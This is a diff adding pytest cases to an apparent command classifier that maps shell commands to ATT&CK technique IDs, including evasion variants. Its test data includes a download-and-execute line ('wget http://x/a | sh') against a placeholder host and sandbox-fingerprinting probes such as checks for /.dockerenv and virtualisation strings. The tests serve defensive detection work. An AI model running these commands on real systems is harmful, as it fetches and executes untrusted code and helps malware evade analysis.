@@ -390,3 +390,37 @@ def test_cli_show_unknown_session_fails_cleanly(cli_db, capsys):
     assert main(["show", "zzz", "--db", cli_db]) == 2
 
     assert "no session" in capsys.readouterr().err
+
+
+# --- evasion handling and fingerprinting probes ------------------------------
+
+
+@pytest.mark.parametrize(
+    ("command", "technique"),
+    [
+        ('bash -c "wget http://x/a | sh"', "T1105"),
+        ("sh -c 'cat /proc/cpuinfo'", "T1082"),
+        ("sh -c \"bash -c 'uname -a'\"", "T1082"),
+        ('echo "x; uname -a', "T1082"),  # unterminated quote must not hide the rest
+        ("\\wget http://x/a", "T1105"),
+        ("( uname -a )", "T1082"),
+        ("{ uname -a; }", "T1082"),
+        ("if true; then uname -a; fi", "T1082"),
+        ("dmesg | grep -i virtual", "T1497"),
+        ("cat /proc/1/cgroup", "T1497"),
+        ("ls /.dockerenv", "T1497"),
+        ("cat /sys/class/dmi/id/product_name", "T1497"),
+        ("ssh -V", "T1518"),
+    ],
+)
+def test_evasions_and_probes_are_still_mapped(command, technique):
+    assert technique in techniques(command)
+
+
+@pytest.mark.parametrize("command", ["ssh -V", "ssh  -V", "ssh -vV"])
+def test_ssh_version_check_is_not_lateral_movement(command):
+    assert "T1021.004" not in techniques(command)
+
+
+def test_unterminated_quote_still_splits():
+    assert "uname -a" in split_commands('echo "x; uname -a')
